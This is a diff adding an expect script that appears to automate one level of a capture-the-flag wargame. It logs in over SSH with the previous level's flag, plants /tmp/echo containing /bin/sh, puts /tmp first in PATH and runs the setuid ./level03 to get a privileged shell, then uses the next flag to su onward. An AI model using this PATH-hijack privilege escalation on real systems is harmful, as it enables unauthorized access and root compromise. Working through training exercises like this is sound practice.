@@ -1,0 +1,30 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set level [ lindex $argv 2 ]
+set password [ exec cat "../../flag02/flag" ]
+
+spawn ssh "$level\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "echo /bin/sh > /tmp/echo\r"
+	send "chmod +x /tmp/echo\r"
+	send "export PATH=/tmp:\$PATH\r"
+	send "./level03\r"
+
+expect -re {\$ $}
+	send "getflag\r"
+	send "exit\r"
+	send "su level04\r"
+
+set flag [ exec cat ../flag ]
+expect "Password:" { send "$flag\r" }
+
+expect -re {\$ $}
+	send "id\r"
+	send "exit\r"
+	send "exit\r"
+	send "exit\r"
